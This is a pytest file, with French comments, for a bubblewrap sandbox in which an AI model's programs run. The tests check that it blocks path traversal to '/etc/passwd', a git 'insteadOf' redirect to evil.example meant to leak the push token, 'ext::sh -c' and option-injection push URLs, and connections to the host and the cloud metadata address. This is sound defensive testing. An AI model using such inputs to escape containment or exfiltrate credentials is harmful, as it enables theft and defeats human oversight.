"""L'atelier réel (bubblewrap) contre son contrat.

- un chemin est résolu puis vérifié : ``..``, un chemin absolu et le lien
  symbolique qui sort du dossier sont refusés ; ``.git`` ne s'écrit pas ;
- une édition ambiguë échoue au lieu de deviner ;
- un programme ne voit ni l'environnement du serveur (ses clés), ni le
  réseau, ni le reste du disque ; un délai tue tout son groupe ; la sortie
  est bornée ;
- sans bubblewrap, rien ne s'exécute (pas de repli aux droits du serveur) ;
- git : une amorce, puis un commit seulement quand quelque chose a changé ;
- un programme est borné comme une app de la Forge (mémoire, taille d'un
  fichier, sortie par un tube plafonné : au-delà, il est tué) ; un atelier trop
  gros n'accepte plus que du ménage ; une exécution annulée tue ce qu'elle a
  lancé (PRJ-1, PRJ-11) ;
- une commande approuvée a Internet, jamais la machine ni le réseau local ;
  sans réseau isolé, elle ne part pas (PRJ-6) ;
- l'arbre se lit depuis git, un lien cassé y est une entrée, ``.venv`` et
  ``node_modules`` n'y sont pas (PRJ-7, PRJ-15).
"""

from __future__ import annotations

import asyncio
import os
import shutil
import socket
import threading

import pytest

from mika.adapters.workshop import BwrapWorkshop, Limits
from mika.ports.workshop import OutsideWorkshop, WorkshopFull

needs_bwrap = pytest.mark.skipif(shutil.which("bwrap") is None, reason="bubblewrap absent")
needs_pasta = pytest.mark.skipif(not all(shutil.which(x) for x in ("bwrap", "pasta", "ip")),
                                 reason="bubblewrap, pasta ou ip absent")
MIB = 1024 ** 2


def go(coro):
    return asyncio.run(coro)


def test_paths_are_resolved_then_checked(tmp_path):
    ws = BwrapWorkshop(tmp_path / "ateliers", bwrap="")
    outside = tmp_path / "dehors"
    outside.mkdir()
    (outside / "secret.txt").write_text("CANARI")
    folder = ws.folder(1)
    folder.mkdir(parents=True)
    (folder / "fuite").symlink_to(outside)
    for bad in ("../dehors/secret.txt", "/etc/passwd", "fuite/secret.txt", "fuite/nouveau.txt"):
        with pytest.raises(OutsideWorkshop):
            go(ws.write(1, bad, "x"))
    with pytest.raises(OutsideWorkshop):
        go(ws.read(1, "fuite/secret.txt"))
    for organ in (".git/config", ".atelier-home/.bashrc"):
        with pytest.raises(OutsideWorkshop):
            go(ws.write(1, organ, "x"))
    assert (outside / "secret.txt").read_text() == "CANARI" and not (outside / "nouveau.txt").exists()


def test_an_ambiguous_edit_fails_instead_of_guessing(tmp_path):
    ws = BwrapWorkshop(tmp_path, bwrap="")
    go(ws.write(1, "a.py", "x = 1\nx = 1\n"))
    with pytest.raises(ValueError, match="2 fois"):
        go(ws.edit(1, "a.py", "x = 1", "x = 2"))
    with pytest.raises(ValueError, match="introuvable"):
        go(ws.edit(1, "a.py", "y = 1", "y = 2"))
    go(ws.edit(1, "a.py", "x = 1\nx = 1", "x = 3"))
    assert go(ws.read(1, "a.py")) == "x = 3\n"


def test_without_bubblewrap_nothing_runs(tmp_path):
    ws = BwrapWorkshop(tmp_path, bwrap="")
    r = go(ws.run(1, ["python3", "-c", "print('hors de la cage')"]))
    assert not r.ok and "bubblewrap" in r.refused and r.returncode is None


def test_a_program_outside_the_allowlist_is_refused_by_name(tmp_path):
    ws = BwrapWorkshop(tmp_path)
    r = go(ws.run(1, ["curl", "https://exemple.org"]))
    assert r.refused and "curl" in r.refused and "python3" in r.refused


@needs_bwrap
def test_a_program_sees_neither_the_server_secrets_nor_the_network_nor_the_disk(tmp_path, monkeypatch):
    monkeypatch.setenv("MIKA_SECRET_KEY", "CANARI-cle")
    ws = BwrapWorkshop(tmp_path / "ateliers")
    env = go(ws.run(1, ["python3", "-c", "import os; print(sorted(os.environ.items()))"]))
    assert env.ok and "CANARI" not in env.stdout and "MIKA_ATELIER" in env.stdout
    net = go(ws.run(1, ["python3", "-c", "import socket; socket.create_connection(('1.1.1.1', 53), 2)"]))
    assert not net.ok
    home = os.path.expanduser("~")
    disk = go(ws.run(1, ["python3", "-c", f"open({home + '/mika-evasion.txt'!r}, 'w').write('x')"]))
    assert not disk.ok and not os.path.exists(home + "/mika-evasion.txt")
    mine = go(ws.run(1, ["python3", "-c", "open('dedans.txt', 'w').write('ok')"]))
    assert mine.ok and (ws.folder(1) / "dedans.txt").read_text() == "ok"


@needs_bwrap
def test_a_timeout_kills_the_whole_group_and_output_is_bounded(tmp_path):
    ws = BwrapWorkshop(tmp_path, max_output_chars=1000)
    slow = go(ws.run(1, ["sh", "-c", "sleep 30 & sleep 30"], timeout_s=1))
    assert slow.timed_out and not slow.ok and slow.duration_ms < 10_000
    loud = go(ws.run(1, ["python3", "-c", "print('x' * 100000)"]))
    assert loud.ok and loud.truncated and len(loud.stdout) < 2000


@needs_bwrap
def test_git_seals_its_start_then_commits_only_what_changed(tmp_path):
    ws = BwrapWorkshop(tmp_path)
    go(ws.write(1, "notes.md", "premier jet\n"))
    first = go(ws.commit(1, "premier pas"))
    assert first
    assert go(ws.commit(1, "rien de neuf")) == ""  # jamais de commit vide
    go(ws.edit(1, "notes.md", "premier jet", "deuxième jet"))
    assert "deuxième jet" in go(ws.diff(1))
    assert go(ws.commit(1, "deuxième pas"))
    assert go(ws.log(1)).splitlines()[0].endswith("deuxième pas")
    assert [ln.split(" ", 1)[1] for ln in go(ws.log(1)).splitlines()] == ["deuxième pas", "premier pas",
                                                                            "atelier ouvert"]
    assert go(ws.log(1, 1, offset=1)).splitlines()[0].endswith("premier pas")
    assert not go(ws.log(1, 1, offset=3)).strip()


# ── Le dépôt distant : ce qui porte le jeton ne lit que ce que l'atelier a posé ────


@needs_bwrap
def test_what_the_model_runs_cannot_touch_the_git_that_carries_the_token(tmp_path):
    ws = BwrapWorkshop(tmp_path, credentials=lambda: {"token": "ghp_SECRET", "hosts": ["github.com"]})
    go(ws.write(1, "a.py", "x = 1\n"))
    folder = ws.folder(1)
    # ce que le modèle lance lit le dépôt mais ne l'écrit pas (ni un fichier, ni sa configuration)
    wrote = go(ws.run(1, ["sh", "-c", "echo x > .git/probe"]))
    configured = go(ws.run(1, ["git", "config", "--local", "url.https://evil.example/.insteadOf",
                               "https://github.com/"]))
    assert not wrote.ok and not configured.ok and not (folder / ".git" / "probe").exists()
    assert go(ws.run(1, ["git", "log", "--oneline"])).ok  # lire, oui
    # une configuration « globale » posée dans la maison de l'atelier (par le modèle, ou un dépôt récupéré) est ignorée
    (folder / ".atelier-home" / ".gitconfig").write_text('[probe]\n\tkey = du-modele\n', encoding="utf-8")
    assert go(ws._git(1, "config", "--get", "probe.key")).stdout.strip() == ""
    # une clé locale inattendue (posée par un autre chemin) : pas d'envoi, et pas de réseau tenté
    with (folder / ".git" / "config").open("a", encoding="utf-8") as f:
        f.write('[url "https://evil.example/"]\n\tinsteadOf = https://github.com/\n')
    refused = go(ws.push(1, "https://github.com/moi/depot.git", "main"))
    assert refused.refused and "configuration locale inattendue" in refused.refused


def test_the_token_is_shown_only_to_its_hosts_and_only_for_the_repository(tmp_path):
    ws = BwrapWorkshop(tmp_path, bwrap="", credentials=lambda: {"token": "ghp_SECRET", "user": "x-access-token",
                                                                 "hosts": ["github.com", "git.example"]})
    env, secrets, why = ws._auth("https://github.com/moi/depot.git")
    assert not why and env["GIT_CONFIG_KEY_0"] == "http.https://github.com/moi/depot.git.extraheader"
    assert "ghp_SECRET" in secrets and env["GIT_CONFIG_VALUE_0"].startswith("AUTHORIZATION: basic ")
    assert "ghp_SECRET" not in env["GIT_CONFIG_VALUE_0"]  # encodé, et effacé des sorties sous les deux formes
    port, _, _ = ws._auth("https://git.example:8443/equipe/outils.git")
    assert port["GIT_CONFIG_KEY_0"] == "http.https://git.example:8443/equipe/outils.git.extraheader"  # le port reste
    other, none, why = ws._auth("https://evil.example/moi/depot.git")
    assert "GIT_CONFIG_KEY_0" not in other and none == () and "evil.example" in why
    refused = go(ws.push(1, "https://evil.example/moi/depot.git", "main"))
    assert refused.refused.startswith("pas d'envoi : le jeton n'est pas autorisé")
    for url in ("http://github.com/x.git", "https://moi:pw@github.com/x.git", "ext::sh -c x", "-https://x"):
        assert go(ws.push(1, url, "main")).refused
    assert go(ws.push(1, "https://github.com/x.git", "--force")).refused


@needs_bwrap
def test_secrets_are_scrubbed_before_the_output_is_cut(tmp_path):
    ws = BwrapWorkshop(tmp_path, max_output_chars=100)
    go(ws.write(1, "a.txt", "x"))
    script = "head -c 60 /dev/zero | tr '\\\\0' a; printf ghp_SECRET; head -c 200 /dev/zero | tr '\\\\0' b"
    got = go(ws.run(1, ["sh", "-c", script], secrets=("ghp_SECRET",)))
    assert "ghp_SECRET" not in got.stdout and "ghp_" not in got.stdout and got.truncated


@needs_bwrap
def test_a_commit_message_cannot_forge_a_line_of_history(tmp_path):
    ws = BwrapWorkshop(tmp_path)
    go(ws.write(1, "a.py", "x = 1\n"))
    go(ws.commit(1, "premier"))
    go(ws.write(1, "a.py", "x = 2\n"))
    forged = "vrai titre\x1edeadbeef\x1f1\x1fpirate\x1ffaux"
    assert go(ws._git(1, "commit", "-qam", forged)).ok
    commits = go(ws.commits(1, 10))
    assert len(commits) == 3 and {c.author for c in commits} == {"Mika"}
    assert [c.title for c in commits][-1] == "atelier ouvert"
    assert go(ws.head(1)) == go(ws._git(1, "rev-parse", "HEAD")).stdout.strip()


@needs_bwrap
def test_a_push_sends_the_pinned_commit_not_what_head_became(tmp_path):
    ws = BwrapWorkshop(tmp_path, credentials=lambda: {"token": "ghp_SECRET", "hosts": ["github.com"]})
    go(ws.write(1, "a.py", "x = 1\n"))
    go(ws.commit(1, "premier"))
    pinned = go(ws.head(1))
    seen: list[tuple[str, ...]] = []

    async def fake_git(goal, *args, **kw):  # sans réseau : on regarde ce qui serait poussé
        if "push" in args:
            seen.append(args)
            return await BwrapWorkshop._git(ws, goal, "rev-parse", "HEAD")
        return await BwrapWorkshop._git(ws, goal, *args, **kw)

    ws._git = fake_git  # type: ignore[method-assign]
    go(ws.write(1, "a.py", "x = 2\n"))
    go(ws.commit(1, "après l'accord"))
    assert go(ws.head(1)) != pinned
    go(ws.push(1, "https://github.com/moi/depot.git", "main", pinned))
    [args] = seen
    assert f"{pinned}:refs/heads/main" in args and "credential.helper=" in args and "protocol.allow=never" in args
    assert go(ws.push(1, "https://github.com/moi/depot.git", "main", "0" * 40)).refused  # un commit inconnu


# ── Un bac à sable qui tient (PRJ-1, PRJ-11, PRJ-6, PRJ-7, PRJ-15) ──────────


@needs_bwrap
def test_a_program_is_bounded_in_memory_file_size_and_output(tmp_path):
    ws = BwrapWorkshop(tmp_path, limits=Limits(memory_bytes=512 * MIB, file_bytes=MIB, output_bytes=MIB))
    hungry = go(ws.run(1, ["python3", "-c", "x = bytearray(1024 * 1024 ** 2); print('alloué')"]))
    assert not hungry.ok and "alloué" not in hungry.stdout  # la mémoire : son espace, pas celui du serveur
    fat = go(ws.run(1, ["python3", "-c", "open('gros', 'wb').write(b'x' * (4 * 1024 ** 2))"]))
    assert not fat.ok and (ws.folder(1) / "gros").stat().st_size <= MIB  # un fichier : borné aussi
    loud = go(ws.run(1, ["python3", "-c", "import sys\nwhile True: sys.stdout.write('x' * 65536)"], timeout_s=60))
    assert not loud.ok and not loud.timed_out and loud.duration_ms < 20_000  # tué au dépassement, pas au délai
    assert any("sortie dépassait" in n for n in loud.notes) and loud.truncated


@needs_bwrap
def test_a_workshop_too_big_only_accepts_cleaning(tmp_path):
    ws = BwrapWorkshop(tmp_path, limits=Limits(workshop_bytes=MIB))
    grew = go(ws.run(1, ["python3", "-c", "open('gros', 'wb').write(b'x' * (2 * 1024 ** 2))"]))
    assert grew.ok and any("fais de la place" in n for n in grew.notes)  # elle le lit dans ce que ça a donné
    with pytest.raises(WorkshopFull):
        go(ws.write(1, "notes.md", "encore"))
    assert "fais de la place" in go(ws.run(1, ["python3", "-c", "print(1)"])).refused
    assert go(ws.run(1, ["rm", "gros"])).ok  # le ménage, si
    assert go(ws.write(1, "notes.md", "de la place")) == "notes.md"


def test_a_workshop_filled_file_by_file_is_bounded_without_running_anything(tmp_path):
    ws = BwrapWorkshop(tmp_path, bwrap="", limits=Limits(workshop_bytes=MIB))
    (ws.folder(1)).mkdir(parents=True)
    (ws.folder(1) / "deja.bin").write_bytes(b"x" * (2 * MIB))  # posé là avant (un dépôt, une version d'avant)
    with pytest.raises(WorkshopFull):
        go(ws.write(1, "un-de-plus.md", "x"))


@pytest.mark.slow
@needs_bwrap
def test_a_cancelled_run_kills_what_it_started(tmp_path):
    ws = BwrapWorkshop(tmp_path)

    async def scenario():
        task = asyncio.create_task(ws.run(1, ["sh", "-c", "sleep 3; echo fait > marque"], timeout_s=60))
        await asyncio.sleep(1.5)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task
        await asyncio.sleep(3)

    go(scenario())
    assert not (ws.folder(1) / "marque").exists()  # l'exécution annulée n'a rien laissé tourner derrière elle


class _Listener:
    """Un service de la machine hôte (toutes ses adresses) : la cage ne doit jamais le joindre."""

    def __init__(self) -> None:
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", 0))
        self.sock.listen(8)
        self.port = self.sock.getsockname()[1]
        self.reached: list[object] = []
        threading.Thread(target=self._accept, daemon=True).start()

    def _accept(self) -> None:
        while True:
            try:
                conn, peer = self.sock.accept()
            except OSError:
                return
            self.reached.append(peer)
            conn.close()

    def close(self) -> None:
        self.sock.close()


@needs_pasta
def test_an_approved_network_command_reaches_neither_the_machine_nor_the_local_network(tmp_path):
    ws = BwrapWorkshop(tmp_path)
    host = _Listener()
    try:
        targets = [("127.0.0.1", host.port), *((str(a), host.port) for a in ws._host_addresses()),
                   ("10.0.0.1", 80), ("100.64.0.1", 80), ("169.254.169.254", 80), ("192.168.1.1", 80)]
        code = ("import socket\n"
                f"for h, p in {targets!r}:\n"
                "    try:\n"
                "        socket.create_connection((h, p), 2); print('JOINT', h)\n"
                "    except OSError as e:\n"
                "        print('non', h)\n")
        r = go(ws.run(1, ["python3", "-c", code], network=True, timeout_s=60))
    finally:
        host.close()
    assert r.returncode == 0, r.summary() + r.stderr
    assert "JOINT" not in r.stdout and r.stdout.count("non ") == len(targets)
    assert host.reached == []  # rien n'est arrivé jusqu'à la machine


@needs_bwrap
def test_without_an_isolated_network_a_network_command_does_not_leave(tmp_path):
    ws = BwrapWorkshop(tmp_path, pasta="")
    r = go(ws.run(1, ["curl", "https://exemple.org"], network=True))
    assert r.returncode is None and "réseau isolé" in r.refused  # jamais le réseau de l'hôte en repli


@needs_bwrap
def test_the_tree_comes_from_git_keeps_a_broken_link_and_skips_the_noise(tmp_path):
    ws = BwrapWorkshop(tmp_path)
    go(ws.write(1, "src/app.py", "print(1)\n"))
    os.symlink("nulle-part", ws.folder(1) / "lien")
    noise = ws.folder(1) / "node_modules" / "paquet"
    noise.mkdir(parents=True)
    for i in range(300):
        (noise / f"f{i}.js").write_text("x")
    (ws.folder(1) / "vieux.pyc").write_bytes(b"x")  # ignoré par git : pas une entrée de son travail
    tree = go(ws.tree(1))
    assert "lien (lien)" in tree and "src/app.py (9 o)" in tree  # un lien cassé est une entrée, pas une panne
    assert not [t for t in tree if "node_modules" in t or ".pyc" in t]
    ignore = next(i for i, t in enumerate(tree) if t.startswith(".gitignore ("))
    assert ignore < tree.index("src/app.py (9 o)")  # les plus proches de la racine d'abord
    bare = BwrapWorkshop(tmp_path / "sans-git", bwrap="")  # sans dépôt : un parcours borné, même règle
    (bare.folder(2) / "node_modules" / "x").mkdir(parents=True)
    (bare.folder(2) / "node_modules" / "x" / "y.js").write_text("x")
    os.symlink("nulle-part", bare.folder(2) / "lien")
    assert go(bare.tree(2)) == ["lien (lien)"]
